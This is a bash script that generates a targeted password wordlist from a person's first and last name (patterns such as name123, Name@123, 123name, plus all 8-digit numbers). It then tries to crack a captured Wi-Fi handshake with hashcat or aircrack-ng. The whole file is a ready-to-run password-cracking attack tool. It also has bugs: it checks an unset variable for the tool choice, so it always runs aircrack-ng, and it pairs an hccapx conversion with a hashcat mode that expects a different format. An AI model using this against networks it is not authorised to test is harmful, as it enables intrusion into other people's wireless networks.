#!/bin/bash

# Check if cap2hccapx is installed
if ! command -v /usr/lib/hashcat-utils/cap2hccapx.bin &> /dev/null
then
    # Install hashcat-utils package
    echo "[!] cap2hccapx is not installed. Installing hashcat-utils package..."
    if [ "$(id -u)" != "0" ]; then
        sudo apt-get update
        sudo apt-get install hashcat-utils
    else
        apt-get update
        apt-get install hashcat-utils
    fi
else
    echo "[+] cap2hccapx is already installed."
fi

read -p "[?] Enter First Name: " FIRST_NAME
read -p "[?] Enter Last Name (leave blank if none): " LAST_NAME
read -p "[?] Enter Cap File Path (leave blank only want to generate wordlist): " CAP_PATH

if [ $CAP_PATH ]
then
  read -p "[?] Want to use (H)ashcat or (A)ircrack ? (h or a): " ATTACK_TOOL
  ATTACK_TOOL=$(echo "$ATTACK_TOOL" | tr '[:upper:]' '[:lower:]')
fi 

firstname=$(echo "$FIRST_NAME" | tr '[:upper:]' '[:lower:]')  # rahul
lastname=$(echo "$LAST_NAME" | tr '[:upper:]' '[:lower:]')    # singh
Firstname="${firstname^}"                                      # Rahul
Lastname="${lastname^}"                                        # Singh

FN_LENGTH=${#FIRST_NAME}
LN_LENGTH=${#LAST_NAME}

# Generate passwords without last name
echo "[*] Generating $firstname""123 >> w1.txt ..."                      # rahul123
crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t $firstname%%% -o w1.txt &> /dev/null

echo "[*] Generating $Firstname""123 >> w2.txt ..."                      # Rahul123
crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t $Firstname%%% -o w2.txt &> /dev/null

echo "[*] Generating $firstname""1234 >> w3.txt ..."                      # rahul1234
crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname%%%% -o w3.txt &> /dev/null

echo "[*] Generating $Firstname""1234 >> w4.txt ..."                      # Rahul1234
crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname%%%% -o w4.txt &> /dev/null

echo "[*] Generating $Firstname@123 >> w5.txt ..."                      # Rahul@123
escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@aaa"
crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $Firstname@%%% -l $escape -o w5.txt &> /dev/null

echo "[*] Generating $firstname@123 >> w6.txt ..."                      # rahul@123
escape="$(printf 'a%.0s' $(seq 1 $FN_LENGTH))@aaa"
crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t $firstname@%%% -l $escape -o w6.txt &> /dev/null

echo "[*] Generating 123$firstname >> w7.txt ..."                      # 123rahul
crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t %%%$firstname -o w7.txt &> /dev/null

echo "[*] Generating 123$Firstname >> w8.txt ..."                      # 123Rahul
crunch $((FN_LENGTH+3)) $((FN_LENGTH+3)) -t %%%$Firstname -o w8.txt &> /dev/null

echo "[*] Generating 123@$Firstname >> w9.txt ..."                      # 123@Rahul
escape="aaa@$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t %%%@$Firstname -l $escape -o w9.txt &> /dev/null

echo "[*] Generating 123@$firstname >> w10.txt ..."                      # 123@rahul
escape="aaa@$(printf 'a%.0s' $(seq 1 $FN_LENGTH))"
crunch $((FN_LENGTH+4)) $((FN_LENGTH+4)) -t %%%@$firstname -l $escape -o w10.txt &> /dev/null

# Generating password with last name
if [ $LN_LENGTH -ne 0 ]
then
  echo "[*] Generating $firstname$lastname123 >> w11.txt ..."              # rahulsingh123
  crunch $((FN_LENGTH+LN_LENGTH+3)) $((FN_LENGTH+LN_LENGTH+3)) -t $firstname$lastname%%% -o w11.txt &> /dev/null

  echo "[*] Generating $Firstname$Lastname123 >> w12.txt ..."              # RahulSingh123
  crunch $((FN_LENGTH+LN_LENGTH+3)) $((FN_LENGTH+LN_LENGTH+3)) -t $Firstname$Lastname%%% -o w12.txt &> /dev/null

  echo "[*] Generating $firstname$lastname@1 >> w13.txt ..."               # rahulsingh@1
  escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@a"
  crunch $((FN_LENGTH+LN_LENGTH+2)) $((FN_LENGTH+LN_LENGTH+2)) -t $firstname$lastname@% -l $escape -o w13.txt &> /dev/null

  echo "[*] Generating $firstname$lastname@1 >> w14.txt ..."               # RahulSingh@1
  escape="$(printf 'a%.0s' $(seq 1 $(($FN_LENGTH+LN_LENGTH))))@a"
  crunch $((FN_LENGTH+LN_LENGTH+2)) $((FN_LENGTH+LN_LENGTH+2)) -t $Firstname$Lastname@% -l $escape -o w14.txt &> /dev/null
fi

# Generating 8 digit numerical wordlist
echo "[*] Generating 12345678 >> digit.txt ..." 
crunch 8 8 -t %%%%%%%% -o digit.txt &> /dev/null 

# Merge all password lists into a single file
if [ $LN_LENGTH -ne 0 ]
then
  cat w1.txt w2.txt w3.txt w4.txt w5.txt w6.txt w7.txt w8.txt w9.txt w10.txt w11.txt w12.txt w13.txt w14.txt digit.txt > mega_wordlist.txt
  rm w1.txt w2.txt w3.txt w4.txt w5.txt w6.txt w7.txt w8.txt w9.txt w10.txt w11.txt w12.txt w13.txt w14.txt digit.txt 
else
  cat w1.txt w2.txt w3.txt w4.txt w5.txt w6.txt w7.txt w8.txt w9.txt w10.txt digit.txt > mega_wordlist.txt
  rm w1.txt w2.txt w3.txt w4.txt w5.txt w6.txt w7.txt w8.txt w9.txt w10.txt digit.txt 
fi 

echo "[>>] Total Passwords Generated: $(cat mega_wordlist.txt | wc -w) [mega_wordlist.txt]"

if [ $CAP_PATH ]; then
  if [ "$attack_mode" == "h" ]; then
    echo "[*] Cracking handshake using hashcat..."
    echo "[*] Converting cap to hccapx file format ..."
    /usr/lib/hashcat-utils/cap2hccapx.bin $CAP_PATH handshake.hccapx &> /dev/null && echo "[+] Done!"
    echo "[*] Cracking Hash using Hashcat ..."
    hashcat -m 22000 handshake.hccapx mega_wordlist.txt 
  else
    echo "[*] Cracking handshake using aircrack-ng..."
    aircrack-ng -w mega_wordlist.txt $CAP_PATH
  fi  
fi
